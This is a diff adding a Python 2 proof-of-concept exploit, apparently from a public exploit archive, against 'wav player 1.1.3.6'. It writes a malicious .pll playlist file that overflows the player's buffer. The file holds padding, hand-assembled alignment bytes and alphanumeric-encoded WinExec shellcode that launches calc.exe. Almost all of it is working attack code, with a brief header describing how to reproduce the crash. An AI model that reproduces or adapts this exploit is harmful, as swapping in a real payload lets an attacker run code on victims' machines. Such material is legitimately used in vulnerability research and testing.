@@ -1,0 +1,59 @@
+# Exploit Title: wav player 1.1.3.6 .pll Buffer Overflow
+# Date: 12/09/2011
+# Author: Ivan Garcia Ferreira
+# Version: 1.1.3.6
+# Tested on: Windows 7 SP1 x86 Spanish
+#
+# Description:
+# Wav player can not handle properly large playlists (more than 1G). 
+# Reproduce:
+# Open the wav player, make a playlist and save it. Then, close the 
+# player and run this exploit to create the new playlist. When you open again 
+# wav player, you will see the calc. ;)
+#
+# Thanks to:
+# Corelan Team for their excelent articles about exploits
+
+fichero = open("wv_player.pll", "w")
+print "[+] Creating exploit .pll..."
+
+fichero.write("A"*1034) # Padding
+
+fichero.write("t%dA")  #help the first ret
+fichero.write("\x6d")  #nop/align
+fichero.write("\x55")  #push ebp
+fichero.write("\x6d")  #nop/align
+fichero.write("\x58")  #pop eax
+fichero.write("\x6d")  #pop/align
+fichero.write("\x05\x14\x11")   #add eax,0x11001400
+fichero.write("\x6d")  #pop/align
+fichero.write("\x2d\x04\x11")   #sub eax,0x11001300
+fichero.write("\x6d")  #pop/align
+
+fichero.write("\x50")  #push eax
+fichero.write("\x6d") #nop/align
+fichero.write("\xc3") #ret
+
+fichero.write("B"*306) # more padding
+
+# Shellcode WinExec "calc.exe"
+fichero.write("PPYAIAIAIAIAQATAXAZAPA3QADAZA" +
+"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA" +
+"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB" +
+"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K" +
+"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL" +
+"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55" +
+"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V" +
+"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB" +
+"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT" +
+"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU" +
+"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM" +
+"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC" +
+"QQ2LRCM0LJA")
+
+# Padding to get the crash
+for cont in range(1,14000):
+	fichero.write("A"*15000)
+fichero.close()
+
+print "[+] File Exploit .pll Created."
